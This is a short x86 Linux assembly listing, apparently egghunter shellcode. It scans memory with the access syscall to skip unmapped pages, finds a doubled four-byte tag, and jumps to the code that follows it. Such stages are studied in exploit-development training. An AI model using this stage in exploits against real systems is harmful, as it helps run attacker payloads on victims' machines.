global _start
section .text
_start:
	xor edx,edx
	mov ebx, 0x09050505  ; token
	xor ecx,ecx
	mul ecx
	incPage:
	or dx, 0xfff
	incMemory:
	inc edx	
	pushad ; push all the general purpose registers on the stack	
	xor ebx,ebx
	lea ebx, [edx+4]
	mov al, 33
	int 0x80

	cmp al,0xf2 ; EFAULT
	popad
	jz  incPage ;move to next page
	
		
	cmp ebx, [edx]
	jnz incMemory 
	
	cmp ebx, [edx+4]
	jnz incMemory
	
	add edx,8
	xor eax,eax
	xor ebx,ebx
	xor ecx,ecx
	jmp edx 	
